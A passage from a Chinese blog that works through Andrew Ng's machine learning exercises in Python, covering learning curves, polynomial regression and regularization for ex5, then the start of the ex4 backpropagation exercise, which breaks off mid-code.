<h2 id="Bias-variance（偏差方差）"><a href="#Bias-variance（偏差方差）" class="headerlink" title="Bias-variance（偏差方差）"></a>Bias-variance（偏差方差）</h2><p>机器学习中的一个重要概念是：偏差方差</p>
<ul>
<li>具有高偏差的模型对于数据来说不够复杂，并且倾向于欠拟合</li>
<li>而具有高方差的模型对训练数据过度拟合</li>
</ul>
<p>在这部分练习中，您将在学习曲线上绘制训练和测试错误，以诊断 “偏差-方差” 问题</p>
<h2 id="Learning-curves-A（学习曲线）"><a href="#Learning-curves-A（学习曲线）" class="headerlink" title="Learning curves A（学习曲线）"></a>Learning curves A（学习曲线）</h2><p>现在，您将实现生成学习曲线的代码，这些曲线在调试学习算法时非常有用</p>
<ul>
<li>为了绘制学习曲线，我们需要使用不同的训练集大小进行训练，得出交叉验证的误差（分别得出训练集，测试集的误差）</li>
<li>要获得不同的训练集大小，应使用原始训练集X的不同子集，可以使用 trainLinearReg 函数来查找θ参数</li>
<li>请注意，lambda 作为参数传递给 learningCurve 函数，在学习θ参数之后，应该计算训练集和交叉验证集的误差</li>
</ul>
<p>实现 learningCurve 函数：生成学习曲线</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> linearCostFunction <span class="keyword">import</span> linear_cost_function <span class="comment"># 正则线性回归代价函数(均方误差)</span></span><br><span class="line"><span class="keyword">from</span> trainLinearRegression <span class="keyword">import</span> train_linear_reg <span class="comment"># 拟合函数fmincg</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">learning_curve</span>(<span class="params">X,Y,Xval,Yval,lmd</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	error_train = np.zeros(m)</span><br><span class="line">	error_val = np.zeros(m)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">		theta = train_linear_reg(X[<span class="number">0</span>:num+<span class="number">1</span>,:],Y[<span class="number">0</span>:num+<span class="number">1</span>],lmd) <span class="comment"># 使用fmincg训练模型</span></span><br><span class="line"></span><br><span class="line">		error_train[num],_ = linear_cost_function(X[<span class="number">0</span>:num+<span class="number">1</span>,:],Y[<span class="number">0</span>:num+<span class="number">1</span>],theta,lmd) <span class="comment"># 获取训练集的cost代价</span></span><br><span class="line">		error_val[num],_ = linear_cost_function(Xval,Yval,theta,lmd) <span class="comment"># 获取测试集的cost代价</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error_train,error_val</span><br></pre></td></tr></table></figure>
<ul>
<li>zeros()：返回来一个给定形状和类型的，用“0”填充的数组</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================== 4.线性回归的学习曲线 ==============</span></span><br><span class="line">lmd = <span class="number">0</span> <span class="comment"># 不包括正则化项</span></span><br><span class="line">error_train,error_val = learning_curve(np.column_stack((np.ones(m),X)),Y,</span><br><span class="line">						np.column_stack((np.ones(Yval.size),Xval)),Yval,lmd)</span><br><span class="line">plt.figure(<span class="number">2</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(m),error_train,<span class="built_in">range</span>(m),error_val)</span><br><span class="line">plt.title(<span class="string">&#x27;Learning Curve for Linear Regression&#x27;</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;Train&#x27;</span>, <span class="string">&#x27;Cross Validation&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Number of Training Examples&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">plt.axis([<span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">150</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：这里直接用“代价”来表示“误差”，其实它们两个本来就是同一个概念（反正它们都是用同一个公式计算出来的）</li>
</ul>
<img src="/2022/05/17/Machine-Learning-Lab5/1652713389053.png" class width="1652713389053"> 
<ul>
<li>随着训练集数目m的增大，训练集和测试集的误差都逐渐趋于平缓，证明模型欠拟合</li>
</ul>
<h2 id="Polynomial-regression（多项式回归）"><a href="#Polynomial-regression（多项式回归）" class="headerlink" title="Polynomial regression（多项式回归）"></a>Polynomial regression（多项式回归）</h2><p>我们的线性模型的问题是，它对数据来说太简单，导致拟合不足（高偏差）</p>
<p>在本练习的这一部分中，您将通过添加更多功能来解决此问题，对于多项式回归，我们的假设有以下形式： </p>
<script type="math/tex; mode=display">
hθ(x)=θ_0+θ_1(waterLevel)+θ_2(waterLevel)^2+ ... +θ_p(waterLevel)^p\\</script><script type="math/tex; mode=display">
hθ(x)=θ_0+θ_1x_1+θ_2x_2+ ... +θ_px_p</script><p>现在，您将使用“更高的x次方”这一方式（第一个公式），在数据集中添加更多功能，这一部分的任务是完成 polyFeatures 中的代码</p>
<p>实现 polyFeatures 函数：将数据映射到多项式特征空间 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ploy_feature</span>(<span class="params">X,p</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>] <span class="comment"># 读取矩阵的长度,(&quot;shape[0]&quot;就是读取矩阵第一维度的长度)</span></span><br><span class="line">	X_poly = np.zeros((m,p)) <span class="comment"># 添加更多特征</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p+<span class="number">1</span>):</span><br><span class="line">		X_poly[:,num-<span class="number">1</span>] = X.flatten() ** num <span class="comment"># 添加&quot;次方项&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> X_poly</span><br></pre></td></tr></table></figure>
<ul>
<li>先对矩阵 X 进行“扩充”，然后提高对应特征的次方（姑且这么理解）</li>
</ul>
<p>实现 featureNormalize 函数：把数据特征标准化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">feature_nomalize</span>(<span class="params">X</span>):</span></span><br><span class="line">	mu = np.mean(X,<span class="number">0</span>) <span class="comment"># 计算每一维度的均值</span></span><br><span class="line">	sigma = np.std(X,<span class="number">0</span>,ddof=<span class="number">1</span>) <span class="comment"># 计算沿指定轴的标准差</span></span><br><span class="line">	X_norm = (X - mu)/sigma</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> X_norm,mu,sigma</span><br></pre></td></tr></table></figure>
<ul>
<li>从数据集中减去每个特征的平均值</li>
<li>减去平均值后，再将特征值按各自的“标准偏差”进行缩放（除）</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =============================== 5.投影特征为多项式 ================</span></span><br><span class="line">p = <span class="number">8</span></span><br><span class="line"><span class="comment"># 投影和标准化训练集</span></span><br><span class="line">X_poly = ploy_feature(X,p)</span><br><span class="line">X_poly,mu,sigma = feature_nomalize(X_poly)</span><br><span class="line">X_poly = np.column_stack((np.ones(Y.size),X_poly)) <span class="comment"># 将一维数组作为列堆叠到二维数组中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 投影和标准化验证集</span></span><br><span class="line">X_poly_val = ploy_feature(Xval,p)</span><br><span class="line">X_poly_val -= mu</span><br><span class="line">X_poly_val /= sigma</span><br><span class="line">X_poly_val = np.column_stack((np.ones(Yval.size),X_poly_val))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 投影和标准化测试集</span></span><br><span class="line">X_poly_test = ploy_feature(Xtest,p)</span><br><span class="line">X_poly_test -= mu</span><br><span class="line">X_poly_test /= sigma</span><br><span class="line">X_poly_test = np.column_stack((np.ones(Ytest.size),X_poly_test))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Normalized Training Example 1 : \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(X_poly[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<h2 id="Learning-curves-B（学习曲线）"><a href="#Learning-curves-B（学习曲线）" class="headerlink" title="Learning curves B（学习曲线）"></a>Learning curves B（学习曲线）</h2><p>然后我们利用标准化的多项式数据来绘制学习曲线：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======================== 6.多项式特征的学习曲线 ===============</span></span><br><span class="line">lmd = <span class="number">0</span></span><br><span class="line"><span class="comment"># 绘制拟合曲线</span></span><br><span class="line">theta = train_linear_reg(X_poly,Y,lmd) <span class="comment"># 拟合函数fmincg </span></span><br><span class="line">x_fit,y_fit = plot_fit(np.<span class="built_in">min</span>(X),np.<span class="built_in">max</span>(X),mu,sigma,theta,p) <span class="comment"># 绘制多项式拟合图</span></span><br><span class="line">plt.figure(<span class="number">3</span>)</span><br><span class="line">plt.scatter(X,Y,c=<span class="string">&#x27;r&#x27;</span>,marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.plot(x_fit,y_fit)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Change in water level (x)&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Water folowing out of the dam (y)&#x27;</span>)</span><br><span class="line">plt.ylim([-<span class="number">60</span>, <span class="number">40</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Polynomial Regression Fit (lambda = &#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(lmd))</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># 计算代价误差</span></span><br><span class="line">error_train, error_val = learning_curve(X_poly, Y, X_poly_val, Yval, lmd)</span><br><span class="line">plt.figure(<span class="number">4</span>)</span><br><span class="line">plt.plot(np.arange(m), error_train, np.arange(m), error_val)</span><br><span class="line">plt.title(<span class="string">&#x27;Polynomial Regression Learning Curve (lambda = &#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(lmd))</span><br><span class="line">plt.legend([<span class="string">&#x27;Train&#x27;</span>, <span class="string">&#x27;Cross Validation&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Number of Training Examples&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">plt.axis([<span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">150</span>])</span><br><span class="line">plt.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Polynomial Regression (lambda = &#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(lmd))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;# Training Examples\tTrain Error\t\tCross Validation Error&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  \t&#123;&#125;\t\t&#123;&#125;\t&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i, error_train[i], error_val[i]))</span><br></pre></td></tr></table></figure>
<p>得到两张图片：（lmd = 0，无正则化）</p>
<p>一，拟合曲线（横坐标：水库水位的变化，纵坐标：从大坝流出的水）：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652768194001.png" class width="1652768194001"> 
<ul>
<li>您应该看到多项式拟合能够很好地遵循数据点，因此获得了较低的训练误差</li>
<li>然而，多项式拟合非常复杂，甚至在极端情况下会下降</li>
<li>这是多项式回归模型 <strong>过度拟合</strong> 训练数据并且不能很好地泛化的指标</li>
</ul>
<p>二，学习曲线：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652768217539.png" class width="1652768217539"> 
<ul>
<li>注意：蓝线一直在最下面</li>
<li>您可以看到学习曲线在低训练误差低但交叉验证误差高的情况下表现出相同的效果</li>
<li>训练和交叉验证错误之间存在差距，表明存在高方差问题</li>
</ul>
<h2 id="Adjusting-the-regularization-parameter（调整正则化参数）"><a href="#Adjusting-the-regularization-parameter（调整正则化参数）" class="headerlink" title="Adjusting the regularization parameter（调整正则化参数）"></a>Adjusting the regularization parameter（调整正则化参数）</h2><p>在本节中，您将观察正则化参数如何影响正则化多项式回归的偏差方差（主要是通过正则化来消除过拟合的影响）</p>
<p>您现在应该修改 ex5.m 中的 lambda 参数并尝试 λ = [1, 100]，对于这些值中的每一个，脚本应该生成适合数据的多项式以及学习曲线</p>
<p>其实就是把上一部分的 “λ=0” 修改为其他值</p>
<ul>
<li>lmd = 1：</li>
</ul>
<img src="/2022/05/17/Machine-Learning-Lab5/1652769307897.png" class width="1652769307897"> 
<img src="/2022/05/17/Machine-Learning-Lab5/1652769200655.png" class width="1652769200655"> 
<ul>
<li>lmd = 100：</li>
</ul>
<img src="/2022/05/17/Machine-Learning-Lab5/1652769491692.png" class width="1652769491692"> 
<img src="/2022/05/17/Machine-Learning-Lab5/1652769505258.png" class width="1652769505258"> 
<p>可以对比一下“λ=0”，“λ=1”，“λ=100”，对模型过拟合的影响（明显“λ=1”的模型效果最好）</p>
<h2 id="Selecting-λ-using-a-cross-validation-set（使用交叉验证集选择λ）"><a href="#Selecting-λ-using-a-cross-validation-set（使用交叉验证集选择λ）" class="headerlink" title="Selecting λ using a cross validation set（使用交叉验证集选择λ）"></a>Selecting λ using a cross validation set（使用交叉验证集选择λ）</h2><p>从练习的前面部分中，您观察到 λ 的值会显着影响正则化多项式回归，在训练集和交叉验证集上的结果</p>
<ul>
<li>特别是，没有正则化（λ = 0）的模型很好地拟合了训练集，但不能泛化</li>
<li>相反，正则化过多（λ = 100）的模型不能很好地拟合训练集和测试集</li>
<li>一个好的 λ 选择（λ = 1）可以很好地拟合数据</li>
</ul>
<p>在本节中，您将实现一个自动方法来选择 λ 参数，具体来说，您将使用交叉验证集来评估每个 λ 值的好坏，在使用交叉验证集选择最佳 λ 值后，我们可以在测试集上评估模型，以估计模型在实际看不见的数据上的表现</p>
<p>您的任务是完成 validationCurve.m 中的代码</p>
<ul>
<li>具体来说，您应该使用 trainLinearReg 函数使用不同的 λ 值训练模型</li>
<li>并计算训练误差和交叉验证误差</li>
<li>您应该在以下范围内尝试 λ：{0, 0.001, 0.003, 0.01, 0.03, 0.1, 0.3, 1, 3, 10}</li>
</ul>
<p>实现 validationCurve 函数：生成交叉验证曲线 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> linearCostFunction <span class="keyword">import</span> linear_cost_function</span><br><span class="line"><span class="keyword">from</span> trainLinearRegression <span class="keyword">import</span> train_linear_reg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation_curve</span>(<span class="params">X,Y,Xval,Yval</span>):</span></span><br><span class="line">	lambda_vec = np.array([<span class="number">0.</span>, <span class="number">0.001</span>, <span class="number">0.003</span>, <span class="number">0.01</span>, <span class="number">0.03</span>, <span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">10</span>])</span><br><span class="line">	error_train = np.zeros(lambda_vec.size)</span><br><span class="line">	error_val = np.zeros(lambda_vec.size)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(lambda_vec.size):</span><br><span class="line">		lmd = lambda_vec[num]</span><br><span class="line">		theta = train_linear_reg(X,Y,lmd)</span><br><span class="line">		error_train[num],_ = linear_cost_function(X,Y,theta,lmd)</span><br><span class="line">		error_val[num],_ = linear_cost_function(Xval,Yval,theta,lmd)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> lambda_vec,error_train,error_val</span><br></pre></td></tr></table></figure>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ============== 7.通过交叉验证集选择正则项系数lambda =========</span></span><br><span class="line">lambda_vec,error_train,error_val = validation_curve(X_poly,Y,X_poly_test,Ytest)</span><br><span class="line">plt.figure(<span class="number">5</span>)</span><br><span class="line">plt.plot(lambda_vec, error_train, lambda_vec, error_val)</span><br><span class="line">plt.legend([<span class="string">&#x27;Train&#x27;</span>, <span class="string">&#x27;Test Validation&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;lambda&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘制图像：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652770124267.png" class width="1652770124267"> 
<ul>
<li>我们可以看到 λ 的最佳值在“3”左右（由于数据集的训练和验证拆分的随机性，交叉验证误差有时可能低于训练错误）</li>
</ul>
<p>PS：lmd = 3：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652770295732.png" class width="1652770295732"> 
<p>可以发现：误差的确比 “lmd=1” 还要小</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/15/Machine-Learning-Lab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/15/Machine-Learning-Lab4/" class="post-title-link" itemprop="url">Machine-Learning-Lab4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-15 16:19:51" itemprop="dateCreated datePublished" datetime="2022-05-15T16:19:51+08:00">2022-05-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:18" itemprop="dateModified" datetime="2022-10-10T00:08:18+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现神经网络的反向传播算法，并将其应用于手写数字识别任务</p>
<ul>
<li>ex4.m - Octave/MATLAB 脚本帮助您完成练习</li>
<li>ex4data1.mat - 手写数字训练集</li>
<li>ex4weights.mat - 神经网络训练的初始权重</li>
<li>submit.m - 提交脚本，将您的解决方案发送到我们的服务器</li>
<li>displayData.m - 帮助可视化数据集的函数</li>
<li>fmincg.m - 功能最小化例行程序（类似于fminunc）</li>
<li>sigmoid.m - Sigmoid 函数（假设陈述）</li>
<li>computeNumericalGradient.m - 计算梯度(倒数)的函数</li>
<li>checkNNGradients.m - 帮助检查梯度的函数（梯度检测）</li>
<li>debugInitializeWeights.m - 初始化权重的函数</li>
<li>predict.m - 神经网络预测函数</li>
<li>[?] sigmoidGradient.m - 计算sigmoid函数的梯度</li>
<li>[?] randInitializeWeights.m - 随机初始化权重</li>
<li>[?] nnCostFunction.m - 神经网络代价函数</li>
</ul>
<h2 id="Neural-Networks（神经网络）"><a href="#Neural-Networks（神经网络）" class="headerlink" title="Neural Networks（神经网络）"></a>Neural Networks（神经网络）</h2><p>在上一个练习中，您实现了神经网络的前馈传播，并使用它使用我们提供的权重预测手写数字</p>
<p>在本练习中，您将实现反向传播算法来学习神经网络的参数，提供的脚本 ex4.m 将帮助你逐步完成这个练习</p>
<p>这与您在上一个练习中使用的数据集相同，ex3data1.mat中有5000个培训示例：</p>
<ul>
<li>其中每个训练示例是数字的 20x20 像素灰度图像</li>
<li>每个像素由一个浮点数表示，表示该位置的灰度强度</li>
<li>20×20 的像素网格被“展开”成400维向量，这些训练示例中的每一个都成为我们的数据矩阵X中的一行</li>
<li>这给了我们一个 5000×400 的矩阵X，其中每一行都是手写数字图像的训练示例</li>
<li>训练集的第二部分是 5000 维向量 y，其中包含训练集的标签</li>
<li>为了与 Octave/MATLAB 索引更兼容，在没有零索引的情况下，我们将数字0映射到值10，因此，“0”数字标记为“10”，而数字“1”至“9”按其自然顺序标记为“1”至“9”</li>
</ul>
<h2 id="Visualizing-the-data（可视化数据）"><a href="#Visualizing-the-data（可视化数据）" class="headerlink" title="Visualizing the data（可视化数据）"></a>Visualizing the data（可视化数据）</h2><p>绘制的过程和上一个实验一样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==================== 1.读取数据，并显示随机样例 ==============================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data\ex4data1.mat&#x27;</span>) <span class="comment"># 使用scipy.io中的函数读取mat文件,data的格式是字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据关键字,分别获得输入数据和输出的真值</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机取出其中的100个样本,显示结果</span></span><br><span class="line">m = X.shape[<span class="number">0</span>] <span class="comment"># m:矩阵长度</span></span><br><span class="line">rand_indices = np.random.permutation(<span class="built_in">range</span>(m)) <span class="comment"># 把[0,m-1]的数据随机排序</span></span><br><span class="line">selected = X[rand_indices[<span class="number">1</span>:<span class="number">100</span>],:] <span class="comment"># 排序后取前100个样本</span></span><br><span class="line">display_data(selected) <span class="comment"># 显示手写数字样例(这里不展示了)</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘制的图像：</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652529225830.png" class width="1652529225830"> 
<h2 id="Model-representation（模型表示）"><a href="#Model-representation（模型表示）" class="headerlink" title="Model representation（模型表示）"></a>Model representation（模型表示）</h2><p>我们的神经网络它有三层——输入层、隐藏层和输出层</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652529620297.png" class width="1652529620297"> 
<ul>
<li>我们的输入是3位数图像的像素值，由于图像的大小为 20×20，这给了我们 400 个输入层单元（不包括总是输出+1的额外偏置单元）</li>
<li>训练数据将由 ex4.m 脚本加载到变量X和y中</li>
<li>我们已经向您提供了一套我们已经培训过的网络参数（θ(1)，θ(2)）这些都存储在 ex4weights.m 中，并将由 ex4.m 加载</li>
</ul>
<h2 id="Feedforward-and-cost-function（正向传播和代价函数）"><a href="#Feedforward-and-cost-function（正向传播和代价函数）" class="headerlink" title="Feedforward and cost function（正向传播和代价函数）"></a>Feedforward and cost function（正向传播和代价函数）</h2><p>现在你将实现神经网络的代价函数和梯度，首先，在 nnCostFunction.m 中完成代码，神经网络的代价函数是：</p>
<script type="math/tex; mode=display">
J(θ)=-\frac{1}{m}[\sum_{i=1}^{m}\sum_{k=1}^{K}y_k^{(i)}log(h_θ(x^{(i)}))_k+(1-y_k^{(i)})log(1-(h_θ(x^{(i)}))_k)]+
\frac{λ}{2m}\sum_{l=1}^{L-1}\sum_{i=1}^{s1}\sum_{j=1}^{s1+1}(θ_{ji}^{(l)})^2</script><p>这里的 hθ(x) 就可以是逻辑回归中的 Sigmoid 函数（假设陈述），而 θ 就是模型的参数向量（在神经网络中也被称为“权重”）</p>
<p>K=10 是可能标签的总数，注意：虽然原始标签（在变量y中）是 1,2,3……10 为了训练神经网络，我们需要将标签重新编码为只包含值0或1的向量</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652530998468.png" class width="1652530998468"> 
<p>实现过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==================== 2.读取参数，并计算代价 ==================================</span></span><br><span class="line">weights = scio.loadmat(<span class="string">&#x27;data\ex4weights.mat&#x27;</span>)</span><br><span class="line">theta1 = weights[<span class="string">&#x27;Theta1&#x27;</span>]	</span><br><span class="line">theta2 = weights[<span class="string">&#x27;Theta2&#x27;</span>]	</span><br><span class="line">nn_paramters = np.concatenate([theta1.flatten(),theta2.flatten()],axis =<span class="number">0</span>) <span class="comment"># 把theta1,theta2转化为一维数组后,进行拼接</span></span><br><span class="line"><span class="comment"># 设置参数</span></span><br><span class="line">input_layer = <span class="number">400</span></span><br><span class="line">hidden_layer = <span class="number">25</span></span><br><span class="line">out_layer = <span class="number">10</span></span><br><span class="line"><span class="comment"># 计算代价,无正则项</span></span><br><span class="line">lmd = <span class="number">0</span></span><br><span class="line">cost,grad = nn_cost_function(X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at parameters (loaded from ex4weights): &#123;:0.6f&#125;\n(This value should be about 0.287629)&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="comment"># 计算代价,带入正则项</span></span><br><span class="line">lmd = <span class="number">1</span></span><br><span class="line">cost,grad = nn_cost_function(X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at parameters (loaded from ex4weights): &#123;:0.6f&#125;\n(This value should be about 